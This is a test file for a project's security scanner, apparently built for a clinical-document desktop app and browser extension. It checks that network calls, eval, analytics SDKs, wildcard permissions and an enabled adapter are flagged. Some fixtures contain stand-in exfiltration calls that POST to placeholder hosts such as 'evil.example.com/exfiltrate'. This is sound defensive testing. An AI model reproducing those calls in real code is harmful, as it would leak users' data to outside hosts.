import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  scanContent,
  BROWSER_CONTEXT_CHECKS,
  MAIN_PROCESS_CHECKS,
  findNonLoopbackUrls,
  runSecurityScan,
  scanIpcChannelNames,
  scanMainProcessBundle,
  scanDeveroAdapter
} from "../../scripts/security-scan-lib.js";

const PROJECT_ROOT = path.resolve(fileURLToPath(import.meta.url), "../../..");

test("scanContent detects fetch, XHR, WebSocket, eval, and known analytics SDKs", () => {
  assert.equal(scanContent('fetch("https://example.com")', BROWSER_CONTEXT_CHECKS).length, 1);
  assert.equal(scanContent("new XMLHttpRequest()", BROWSER_CONTEXT_CHECKS).length, 1);
  assert.equal(scanContent('new WebSocket("wss://x")', BROWSER_CONTEXT_CHECKS).length, 1);
  assert.equal(scanContent('eval("1+1")', BROWSER_CONTEXT_CHECKS).length, 1);
  assert.equal(scanContent('new Function("return 1")()', BROWSER_CONTEXT_CHECKS).length, 1);
  assert.equal(scanContent('script.src = "https://www.google-analytics.com/analytics.js"', BROWSER_CONTEXT_CHECKS).length, 1);
});

test("scanContent finds nothing in ordinary application code", () => {
  const benign = `
    function readIdentity(selectors) {
      return document.querySelectorAll(selectors.patient);
    }
    export const fetchStatus = "not-a-network-call";
  `;
  // Note: "fetchStatus" must not false-positive on the word "fetch" — the pattern requires a call.
  assert.equal(scanContent(benign, BROWSER_CONTEXT_CHECKS).length, 0);
});

test("runSecurityScan against a deliberately poisoned fixture directory reports every violation", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-scan-fixture-"));
  try {
    fs.mkdirSync(path.join(tmpRoot, "extension/dist"), { recursive: true });
    fs.writeFileSync(path.join(tmpRoot, "extension/dist/content.js"), 'fetch("https://evil.example.com/exfiltrate", {method:"POST"});');
    fs.writeFileSync(
      path.join(tmpRoot, "extension/manifest.json"),
      JSON.stringify({
        host_permissions: ["<all_urls>"],
        content_security_policy: { extension_pages: "script-src 'self'" },
        content_scripts: [{ matches: ["*://*/*"] }]
      })
    );
    fs.mkdirSync(path.join(tmpRoot, "adapters/devero-disabled/src"), { recursive: true });
    fs.writeFileSync(path.join(tmpRoot, "adapters/devero-disabled/src/index.ts"), 'export const x = { enabled: true, status: "APPROVED" };');

    const violations = runSecurityScan(tmpRoot);
    const rules = violations.map((v) => v.rule).sort();
    assert.ok(rules.includes("forbidden_network_api"));
    assert.ok(rules.includes("wildcard_host_permission"));
    assert.ok(rules.includes("missing_restrictive_csp"));
    assert.ok(rules.includes("wildcard_content_script_match"));
    assert.ok(rules.includes("devero_adapter_not_disabled"));
    assert.ok(rules.includes("devero_adapter_not_unconfigured"));
    assert.ok(rules.includes("devero_adapter_enabled"));
    // The fixture has no desktop bundle at all: that must be reported, not ignored.
    assert.ok(rules.includes("missing_build_artifact"));
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("P2-4: scanIpcChannelNames catches an IPC channel whose name implies a finalization command", () => {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-ipc-scan-"));
  try {
    const poisoned = path.join(tmpDir, "main.cjs");
    fs.writeFileSync(poisoned, 'ipcMain.handle("document:sign", async () => ({ ok: true }));\nipcMain.handle("worklist:importCsv", async () => ({}));');
    const violations: { file: string; rule: string; detail: string }[] = [];
    scanIpcChannelNames(tmpDir, poisoned, violations);
    assert.equal(violations.length, 1);
    assert.equal(violations[0]?.rule, "finalization_like_ipc_channel");
    assert.equal(violations[0]?.detail, "document:sign");
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test("the actual built project passes the security scan cleanly", () => {
  // Deliberately NOT skippable. This suite's whole purpose is to prove the
  // gate runs against real artifacts; a self-skip on an unbuilt tree would
  // reproduce, inside the test suite, exactly the vacuous pass the scanner
  // was changed to reject. If this fails, run `npm run build:production`.
  const violations = runSecurityScan(PROJECT_ROOT);
  assert.deepEqual(violations, [], JSON.stringify(violations, null, 2));
});

test("a missing build artifact is a hard failure, not a silent pass", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-unbuilt-"));
  try {
    // An entirely unbuilt tree: previously every scan call returned early
    // and the CLI printed "Security scan passed".
    const violations = runSecurityScan(tmpRoot);
    const missing = violations.filter((v) => v.rule === "missing_build_artifact").map((v) => v.file).sort();
    assert.deepEqual(missing, [
      "apps/desktop/dist/main.cjs",
      "apps/desktop/dist/main.cjs",
      "apps/desktop/dist/preload.cjs",
      "apps/desktop/dist/renderer",
      "extension/dist"
    ]);
    assert.ok(violations.every((v) => v.detail.length > 0));
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("a present-but-empty bundle directory is also a missing artifact", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-emptydist-"));
  try {
    fs.mkdirSync(path.join(tmpRoot, "extension/dist"), { recursive: true });
    const violations = runSecurityScan(tmpRoot);
    assert.ok(
      violations.some((v) => v.rule === "missing_build_artifact" && v.file === "extension/dist"),
      "an empty extension/dist must not scan zero files and call that a pass"
    );
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("findNonLoopbackUrls allows loopback destinations and nothing else", () => {
  assert.deepEqual(findNonLoopbackUrls('const base = "http://localhost:4173";'), []);
  assert.deepEqual(findNonLoopbackUrls('fetch("http://127.0.0.1:9222/json/version")'), []);
  assert.deepEqual(findNonLoopbackUrls('fetch("http://[::1]:4173/x")'), []);
  assert.deepEqual(findNonLoopbackUrls('fetch("https://telemetry.example.com/v1/ingest")'), [
    "https://telemetry.example.com/v1/ingest"
  ]);
  // A lookalike host must not be treated as loopback.
  assert.deepEqual(findNonLoopbackUrls('fetch("https://localhost.evil.example/x")'), [
    "https://localhost.evil.example/x"
  ]);
});

test("the main-process bundle is no longer exempt from the network policy", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-mainproc-"));
  try {
    fs.mkdirSync(path.join(tmpRoot, "apps/desktop/dist"), { recursive: true });
    const bundle = path.join(tmpRoot, "apps/desktop/dist/main.cjs");
    fs.writeFileSync(
      bundle,
      'const local = "http://localhost:4173";\n' +
        'fetch("https://exfil.example.com/upload", { method: "POST" });\n' +
        'navigator.sendBeacon("/collect");\n'
    );
    const violations: { file: string; rule: string; detail: string }[] = [];
    scanMainProcessBundle(tmpRoot, bundle, violations);
    const rules = violations.map((v) => v.rule);
    assert.ok(rules.includes("non_loopback_network_destination"), JSON.stringify(violations));
    assert.ok(rules.includes("forbidden_network_api"), JSON.stringify(violations));
    // The permitted local destination must not itself be a violation.
    assert.ok(!violations.some((v) => v.detail.includes("localhost:4173")));
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("a purely local main-process bundle still passes the network policy", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-mainproc-ok-"));
  try {
    fs.mkdirSync(path.join(tmpRoot, "apps/desktop/dist"), { recursive: true });
    const bundle = path.join(tmpRoot, "apps/desktop/dist/main.cjs");
    fs.writeFileSync(bundle, 'const syntheticEhrBaseUrl = "http://localhost:4173";\nawait fetch(`${syntheticEhrBaseUrl}/worklist`);\n');
    const violations: { file: string; rule: string; detail: string }[] = [];
    scanMainProcessBundle(tmpRoot, bundle, violations);
    assert.deepEqual(violations, []);
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("MAIN_PROCESS_CHECKS still forbid analytics and dynamic code", () => {
  assert.equal(scanContent('script.src = "https://cdn.segment.com/analytics.js"', MAIN_PROCESS_CHECKS).length, 1);
  assert.equal(scanContent('new Function("return 1")()', MAIN_PROCESS_CHECKS).length, 1);
});

test("the Devero gate rejects a SECOND enabled adapter object, not just a missing disabled literal", () => {
  const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "rn-doc-runner-devero-"));
  try {
    fs.mkdirSync(path.join(tmpRoot, "adapters/devero-disabled/src"), { recursive: true });
    // Satisfies the old presence-only check exactly, while shipping an
    // enabled + APPROVED adapter alongside it.
    fs.writeFileSync(
      path.join(tmpRoot, "adapters/devero-disabled/src/index.ts"),
      'export const DEVERO_SITE_ADAPTER = { enabled: false, status: "UNCONFIGURED", allowlist: [] };\n' +
        'export const DEVERO_SITE_ADAPTER_V2 = { enabled: true, status: "APPROVED", allowlist: [] };\n'
    );
    const violations: { file: string; rule: string; detail: string }[] = [];
    scanDeveroAdapter(tmpRoot, violations);
    const rules = violations.map((v) => v.rule);
    assert.ok(rules.includes("devero_adapter_enabled"), JSON.stringify(violations));
    assert.ok(rules.includes("devero_adapter_not_unconfigured"), JSON.stringify(violations));
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
});

test("the Devero gate reads code, not the comment prose that mentions enabled: true", () => {
  const violations: { file: string; rule: string; detail: string }[] = [];
  scanDeveroAdapter(PROJECT_ROOT, violations);
  assert.deepEqual(violations, [], JSON.stringify(violations, null, 2));
});
